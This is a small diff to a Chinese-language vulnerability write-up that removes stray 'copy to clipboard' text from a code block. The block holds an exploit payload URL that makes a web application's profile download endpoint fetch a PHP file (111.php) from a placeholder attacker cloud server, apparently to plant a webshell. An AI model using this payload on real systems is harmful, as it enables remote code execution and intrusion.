@@ -13,7 +13,7 @@
 注意这里需要先登录，这处可以直接注册的 payload：
 
 ```auto
-/user/profile/download?url=http://云服务器地址/111.php&path=1Copy to clipboardErrorCopied
+/user/profile/download?url=http://云服务器地址/111.php&path=1
 ```
 
 效果图： ![效果图](https://github.com/user-attachments/assets/455cedb5-1ab7-494f-91aa-9d3a32a8a727)
